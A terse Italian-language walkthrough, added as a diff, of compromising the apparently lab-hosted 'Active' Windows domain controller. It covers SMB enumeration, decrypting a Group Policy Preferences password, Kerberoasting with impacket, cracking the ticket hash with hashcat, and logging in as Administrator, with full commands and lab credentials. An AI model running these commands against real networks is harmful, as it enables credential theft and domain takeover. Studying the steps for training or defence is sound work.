@@ -1,0 +1,37 @@
+scan nmap, DNS aperto in porta 53
+Porta 88 c'è Kerberos, bisogna subito guardare per ldap
+smb su 445
+
+Uso prima quello, solito con NULL authentication senza specificare password
+smbmap comando utile
+smbmap -R replication -H IP; trova tutti i file presenti
+Noto Groups.xml che risulta pieno di info utili solitamente nelle macchine Windows
+
+Lo posso scaricare con 
+smbmap -R replication -H IP -A Groups.xml -q
+
+O andarci da smbclient e usare il solito get.
+Da file username e password codificata
+
+Crackstation non rileva nulla quindi procedo con il tool: gpp-decrypt
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+Posso entrare utilizzando smbclient.py da impacket che mi permette di inserire subito username e password
+sudo /home/sjay/Tools/impacket/examples/smbclient.py SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
+
+Entro nel Desktop e trovo user.txt
+
+Devo prendere le credenziali del root, per farlo ricordiamo che è presente Kerberos, che è un servizio vulnerabile tramite dei Ticket.
+Per cominciare utilizziamo un comando presente sempre nella libreria impacket
+python3 /home/sjay/Tools/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+
+Trovo la hash
+Vado su https://hashcat.net/wiki/doku.php?id=example_hashes per cercare le prime 4-5 lettere e capire che hash è, per sapere poi la modalità da inserire nell'hashcat
+
+hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+Posso entrare come root
+python3 /home/sjay/Tools/impacket/examples/smbclient.py Administrator:Ticketmaster1968@10.10.10.100
+
+
+
